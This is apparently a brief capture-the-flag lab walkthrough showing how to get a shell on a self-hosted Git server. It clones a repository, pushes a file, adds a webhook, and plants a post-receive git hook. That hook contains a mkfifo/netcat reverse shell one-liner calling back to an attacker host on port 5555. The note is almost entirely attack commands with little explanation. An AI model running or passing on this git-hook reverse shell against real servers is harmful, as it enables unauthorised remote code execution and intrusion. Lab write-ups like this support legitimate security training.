clone the repo first like

```
http://10.10.178.85:31111/leeroy/jenkins
it will ask for username and password for thespecific user 
then it will clone it
now make a file in that directory and add it 
git add rev.php && git commit -m "Exploiting" && git push -u origin master
it will give error like username not found 
type this line git config --global user.name "ScarryParrot"
now before this make a new webhook and set target url to http://10.18.10.9 and trigger on : all events
and also change git hooks to post-receive 
and add
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.18.10.9 5555 >/tmp/f
```

now wil get a shell on port 5555
